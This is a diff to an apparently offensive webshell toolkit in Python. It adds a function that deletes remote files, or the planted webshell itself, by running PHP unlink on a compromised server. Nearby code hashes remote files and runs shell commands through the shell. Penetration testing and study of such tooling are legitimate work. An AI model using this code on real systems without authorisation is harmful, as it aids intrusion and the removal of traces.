@@ -35,6 +35,21 @@ def hash_remote_file(ws: WebShell, path: str) -> str:
     return ws.run_php(f"echo md5(file_get_contents({php_string(path)}))").strip()
 
 
+def remove(ws: WebShell, path: str | None = None) -> bool:
+    """Delete a remote file. With no ``path`` the webshell deletes *itself*.
+
+    Self-removal (``unlink(__FILE__)``) is the engagement-cleanup counterpart to
+    injection — it lets you pull a dropped shell once you are done with it.
+    """
+    target = php_string(path) if path else "__FILE__"
+    ok = "bool(true)" in ws.run_php(f"var_dump(unlink({target}))")
+    if ok:
+        log.success(f"Removed {path or 'the webshell itself (__FILE__)'}")
+    else:
+        log.error(f"Failed to remove {path or '__FILE__'}")
+    return ok
+
+
 def list_directories(ws: WebShell, path: str) -> list[str]:
     output = ws.run_command(f"find {shlex.quote(path)} -type d")
     return [line for line in output.splitlines() if line and not line.startswith("find:")]
